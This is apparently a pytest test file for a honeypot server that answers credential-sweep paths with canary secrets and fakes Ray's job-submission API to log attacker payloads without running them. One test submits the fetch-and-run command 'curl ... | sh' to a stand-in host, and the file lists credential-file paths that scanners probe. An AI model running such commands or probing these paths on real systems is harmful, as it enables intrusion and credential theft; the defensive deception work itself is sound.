"""Tests for the GPU/HPC cluster-scheduler credential lane and the Ray
dashboard job-submission API it steers a reader into.

A recurring multi-node credential sweep extended its dictionary from
API-key files into *cluster access*: Kubernetes client configs, SSH and
deploy keys, and — the part nothing answered — the batch scheduler and
cluster-launcher configs that sit beside them (`ray.yaml`, `slurm.conf`,
`slurmdbd.conf`, a `gpu-key.pem`, and the `cloud-init` user-data that
injects all of it at boot).

Two things are pinned here. First, the lane answers rather than 404s,
including the backup-sibling and short-form spellings the same pass
walks. Second, and the reason the lane is worth more than a path alias:
the launcher config names this host's own dashboard, and the dashboard's
job-submission API records the `entrypoint` it is handed. Ray's job
submission takes no authentication by default (CVE-2023-48022), so that
next request is one scanners already make — and an entrypoint is a
command line the submitter chose, not another dictionary entry.

Nothing submitted is ever executed; the handler records and responds.
"""
from __future__ import annotations

import json

import pytest
import pytest_asyncio

from flux import server as tbenv

# Reuse the canonical envelope the other test modules assert against, so a
# canary value means the same thing here. The `ssh` half matters: the key
# files in this lane are ssh-canary-backed, and a stub that omits it makes
# them answer 200 with an empty body.
from tests.test_server import FAKE_TRACEBIT


async def _fake_issue_credentials(*args, **kwargs):
    return FAKE_TRACEBIT


@pytest_asyncio.fixture
async def flux_client(aiohttp_client, monkeypatch, tmp_path):
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "issue_credentials", _fake_issue_credentials)
    client = await aiohttp_client(tbenv.create_app())
    client.log_path = tmp_path / "env-canary.jsonl"
    return client


def _log_entries(log_path):
    return [json.loads(line) for line in log_path.read_text().splitlines()]


# --------------------------------------------------------------------------
# The observed dictionary
# --------------------------------------------------------------------------

# Every path in the observed day-3 lane that previously 404'd, plus the
# ones already answered, so a regression anywhere in the lane is caught
# here rather than in whichever module happens to own the renderer.
OBSERVED_LANE = [
    # Kubernetes
    "/talosconfig",
    "/.kube/config.old",
    "/.kube/config.yaml",
    "/kubeconfig.json",
    "/k8s/secrets.yml",
    "/kubernetes/config.yaml",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/serviceaccount/token",
    # SSH / deploy keys
    "/.ssh/id_rsa",
    "/.ssh/id_rsa.pub",
    "/.ssh/id_ecdsa.pub",
    "/ssh/id_rsa",
    "/ssh/id_ed25519",
    "/ssh/config",
    "/ssh/authorized_keys",
    "/authorized_keys",
    "/keys/id_ed25519",
    "/deploy_key",
    # GPU / HPC scheduling
    "/keys/gpu-key.pem",
    "/gpu.pem",
    "/slurm.conf",
    "/slurmdbd.conf",
    "/ray.yaml",
    # Cloud bootstrap
    "/cloud-init.yaml",
    "/cloud-init.yml",
    "/user-data",
]


@pytest.mark.parametrize("path", OBSERVED_LANE)
async def test_observed_lane_is_answered(flux_client, path):
    """Every path in the observed sweep answers. A 404 anywhere in a
    dictionary pass is a negative signal the scanner gets for free."""
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.9"})
    assert resp.status == 200, path
    assert await resp.read(), path


NEW_LANE_MEMBERS = [
    ("/ray.yaml", "ray-cluster-config"),
    ("/ray.yml", "ray-cluster-config"),
    ("/ray-cluster.yaml", "ray-cluster-config"),
    ("/ray_bootstrap_config.json", "ray-cluster-config"),
    ("/slurm.conf", "slurm-config"),
    ("/etc/slurm/slurm.conf", "slurm-config"),
    ("/slurmdbd.conf", "slurmdbd-config"),
    ("/etc/slurm/slurmdbd.conf", "slurmdbd-config"),
    ("/talosconfig", "talosconfig"),
    ("/.talos/config", "talosconfig"),
    ("/cloud-init.yaml", "cloud-init-user-data"),
    ("/user-data", "cloud-init-user-data"),
    ("/var/lib/cloud/instance/user-data.txt", "cloud-init-user-data"),
]


@pytest.mark.parametrize("path,trap", NEW_LANE_MEMBERS)
async def test_new_lane_routes_to_expected_trap(flux_client, path, trap):
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.10"})
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == trap, entries[-1]["result"]


@pytest.mark.parametrize("path", [
    "/ray.yaml.bak",
    "/slurmdbd.conf.old",
    "/talosconfig.save",
    "/cloud-init.yaml.bak",
])
async def test_lane_answers_backup_siblings(flux_client, path):
    """The observed pass asked for a backup sibling of a cluster config in
    the same breath as the canonical name, which is why the lane joins the
    editor-suffix family."""
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.11"})
    assert resp.status == 200, path


@pytest.mark.parametrize("path", [
    "/ray",
    "/rayyaml",
    "/slurm",
    "/slurmdbd",
    "/talos",
    "/cloud-init",
    "/not-user-data",
])
async def test_lane_does_not_overmatch(flux_client, path):
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.12"})
    assert resp.status == 404, path


async def test_lane_404s_without_an_issuing_key(flux_client, monkeypatch):
    """The lane is canary-backed, so a keyless deployment 404s it rather
    than serving a credential file with empty credential fields."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    for path in ("/ray.yaml", "/slurmdbd.conf", "/talosconfig", "/cloud-init.yaml"):
        resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.13"})
        assert resp.status == 404, path


# --------------------------------------------------------------------------
# Nothing fixed: every credential-shaped field is per-hit
# --------------------------------------------------------------------------

def test_credential_bearing_renderers_vary_per_hit():
    """A fixed credential literal is zero detection on replay and one
    fleet-wide fingerprint. Every renderer in this lane that emits a
    secret-shaped field must produce a different body each hit."""
    r = {"aws": FAKE_TRACEBIT["aws"], "_requestHost": "sensor.example.com"}
    for name, render in (
        ("ray-cluster-config", tbenv.render_ray_cluster_yaml),
        ("slurmdbd-config", tbenv.render_slurmdbd_conf),
        ("talosconfig", tbenv.render_talosconfig),
        ("cloud-init-user-data", tbenv.render_cloud_init_user_data),
    ):
        assert render(r) != render(r), name


def test_slurm_conf_is_stable_and_carries_no_credential():
    """`slurm.conf` is the one member that may be byte-stable: it is
    world-readable by design on every compute node and holds no secret.
    It earns its answer by *naming* the dbd host, which is what makes the
    `slurmdbd.conf` read next door the obvious next request. If a
    credential is ever added to this body, the stability has to go."""
    r = {"aws": FAKE_TRACEBIT["aws"], "_requestHost": "sensor.example.com"}
    body = tbenv.render_slurm_conf(r)
    assert body == tbenv.render_slurm_conf(r)
    text = body.decode()
    for marker in ("Pass", "PASSWORD", "SecretAccessKey", "AKIA", "BEGIN "):
        assert marker not in text, marker
    assert "AccountingStorageHost" in text


def test_launcher_config_points_at_servable_next_steps():
    """The launcher config is only worth more than a path alias if what it
    names is something this server answers. It must publish this host's
    own dashboard, and an `ssh_private_key` path that resolves to an
    issued key rather than a 404."""
    r = {"aws": FAKE_TRACEBIT["aws"], "_requestHost": "sensor.example.com"}
    text = tbenv.render_ray_cluster_yaml(r).decode()
    assert "sensor.example.com" in text
    key_path = "/keys/gpu-key.pem"
    assert f"ssh_private_key: {key_path}" in text
    assert key_path in tbenv._TRAP_BY_PATH, "launcher names a key path nothing serves"


def test_launcher_config_never_publishes_a_loopback_host():
    """Behind a reverse proxy the Host arriving here is the proxy's
    upstream address. Publishing that would hand a reader an address it
    cannot reach, so the helper falls back exactly as the other
    self-endpoint renderers do."""
    for host in ("127.0.0.1", "localhost", "[::1]", ""):
        text = tbenv.render_ray_cluster_yaml(
            {"aws": FAKE_TRACEBIT["aws"], "_requestHost": host},
        ).decode()
        assert "127.0.0.1" not in text, host
        assert "localhost" not in text, host


# --------------------------------------------------------------------------
# The Ray dashboard job-submission API — the captured-payload step
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path,kind", [
    ("/api/jobs", "list"),
    ("/api/jobs/", "list"),
    ("/ray/api/jobs/", "list"),
    ("/dashboard/ray/api/jobs/", "list"),
    ("/api/jobs/raysubmit_abc123", "status"),
    ("/api/jobs/raysubmit_abc123/logs", "logs"),
    ("/api/cluster_status", "cluster"),
    ("/api/ray/version", "cluster"),
    ("/api/serve/applications/", "cluster"),
])
def test_ray_jobs_kind_matches(path, kind):
    assert tbenv.ray_jobs_kind(path) == kind, path


@pytest.mark.parametrize("path", [
    "/api/jobsx",
    "/api/job",
    "/jobs",
    # Deeper than two mount segments is not a mount.
    "/a/b/c/api/jobs/",
    # Ollama's version endpoint keeps its own handler.
    "/api/version",
    "/api/jobs/abc/logs/extra",
])
def test_ray_jobs_kind_does_not_overmatch(path):
    assert tbenv.ray_jobs_kind(path) == "", path


async def test_ray_jobs_list_is_a_cluster_worth_submitting_to(flux_client):
    resp = await flux_client.get("/api/jobs/", headers={"X-Forwarded-For": "203.0.113.20"})
    assert resp.status == 200
    jobs = json.loads(await resp.read())
    assert isinstance(jobs, list) and jobs
    assert all(j["submission_id"].startswith("raysubmit_") for j in jobs)
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "ray-jobs-list"


async def test_ray_job_submission_captures_the_entrypoint(flux_client):
    """The whole point of the trap: the submitted command line is recorded
    in full, because it is a payload the submitter chose rather than a
    path from a dictionary."""
    body = {
        "entrypoint": "curl -s http://198.51.100.9/x.sh | sh",
        "runtime_env": {
            "working_dir": "https://staging.example/payload.zip",
            "pip": ["requests", "boto3"],
            "env_vars": {"AWS_SECRET_ACCESS_KEY": "should-not-be-retained"},
        },
    }
    resp = await flux_client.post(
        "/api/jobs/", json=body, headers={"X-Forwarded-For": "203.0.113.21"},
    )
    assert resp.status == 200
    issued = json.loads(await resp.read())["submission_id"]
    assert issued.startswith("raysubmit_")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ray-jobs-submit"
    assert entry["rayEntrypoint"] == body["entrypoint"]
    assert entry["rayWorkingDir"] == "https://staging.example/payload.zip"
    assert entry["rayPipPackages"] == ["requests", "boto3"]
    assert entry["raySubmissionIdIssued"] == issued
    # Names, never values: the submitter's own credentials are not ours to
    # retain, and a honeypot log is not the place to collect them.
    assert entry["rayEnvVarNames"] == ["AWS_SECRET_ACCESS_KEY"]
    assert "should-not-be-retained" not in json.dumps(entry)


async def test_ray_job_submission_honours_a_caller_chosen_id(flux_client):
    """The CLI polls the id it asked for, so echoing a different one ends
    the interaction one request early."""
    resp = await flux_client.post(
        "/api/jobs/",
        json={"entrypoint": "python x.py", "submission_id": "raysubmit_mine1"},
        headers={"X-Forwarded-For": "203.0.113.22"},
    )
    assert json.loads(await resp.read())["submission_id"] == "raysubmit_mine1"


async def test_ray_job_submission_survives_a_body_that_is_not_json(flux_client):
    """A probe that posts junk still gets a submission id, and the junk is
    still recorded by the global body hash rather than dropped."""
    resp = await flux_client.post(
        "/api/jobs/", data=b"\xff\xfe not json",
        headers={"X-Forwarded-For": "203.0.113.23"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ray-jobs-submit"
    assert "rayEntrypoint" not in entry


async def test_ray_job_status_and_logs_tell_a_consistent_story(flux_client):
    status = await flux_client.get(
        "/api/jobs/raysubmit_poll1", headers={"X-Forwarded-For": "203.0.113.24"},
    )
    assert status.status == 200
    doc = json.loads(await status.read())
    assert doc["submission_id"] == "raysubmit_poll1"
    assert doc["status"] == "RUNNING"

    logs = await flux_client.get(
        "/api/jobs/raysubmit_poll1/logs", headers={"X-Forwarded-For": "203.0.113.25"},
    )
    assert logs.status == 200
    log_doc = json.loads(await logs.read())
    # The driver output must not echo the submitted entrypoint back: a
    # reader that sees its own command quoted learns it was not run.
    assert "logs" in log_doc
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ray-jobs-logs"
    assert entry["raySubmissionIdRead"] == "raysubmit_poll1"


async def test_ray_jobs_needs_no_issuing_key(flux_client, monkeypatch):
    """Nothing is minted here, so a keyless deployment still answers. A
    cluster config naming a dashboard this server 404s is a dead end."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get("/api/jobs/", headers={"X-Forwarded-For": "203.0.113.26"})
    assert resp.status == 200


async def test_ray_jobs_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "RAY_JOBS_ENABLED", False)
    resp = await flux_client.get("/api/jobs/", headers={"X-Forwarded-For": "203.0.113.27"})
    assert resp.status == 404


def test_ray_jobs_defaults_on():
    assert tbenv.RAY_JOBS_ENABLED
